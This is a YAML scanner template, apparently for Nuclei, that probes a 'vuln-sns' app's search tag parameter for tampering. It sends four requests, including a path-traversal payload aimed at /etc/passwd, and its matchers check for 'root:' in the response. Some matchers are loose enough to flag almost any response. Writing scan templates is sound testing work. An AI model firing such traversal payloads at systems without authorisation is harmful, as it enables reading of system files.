id: vuln-sns-search-parameter-tampering

info:
  name: vuln-sns Search Parameter Tampering
  author: devin
  severity: medium
  description: Parameter tampering in search endpoint tag parameter
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-472
  metadata:
    max-request: 4
  tags: parameter-tampering,search,vuln-sns

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag="
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      
      - type: word
        words:
          - "[]"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag=%"
    
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 500
      
      - type: word
        words:
          - "error"
          - "mysql"
        condition: or
        part: body
        case-insensitive: true

  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag=../../../etc/passwd"
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:"
          - "/bin/bash"
          - "/etc/passwd"
        condition: or
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag[]=test&tag[]=admin"
    
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 400
          - 500
